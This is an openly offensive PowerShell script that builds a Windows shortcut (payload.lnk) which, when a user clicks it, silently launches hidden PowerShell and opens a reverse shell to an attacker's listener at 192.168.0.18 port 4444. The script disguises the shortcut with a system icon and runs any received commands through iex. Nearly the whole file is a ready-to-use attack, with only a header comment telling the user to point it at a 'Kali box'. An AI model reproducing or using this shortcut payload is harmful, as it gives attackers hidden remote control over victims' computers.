<#
This sccirpt is used to create LNK file.

The LNK file creates a reverse shell on being clicked by user.

Change the IP address to Local Kali Box.

#>

$WshShell = New-Object -comObject WScript.Shell 

$Shortcut = $WshShell.CreateShortcut("c:\users\sunny\shell\payload.lnk") 

$Shortcut.TargetPath = "$PSHome\powershell.exe" 

$Shortcut.IconLocation = "%SystemRoot%\System32\Shell32.dll,7840" #The Icon which would be displayed.

$Shortcut.Arguments = '-windowstyle hidden /c $client = New-Object System.Net.Sockets.TCPClient("""192.168.0.18""",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + """PS """ + (pwd).Path + """> """;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' 

$Shortcut.Save() 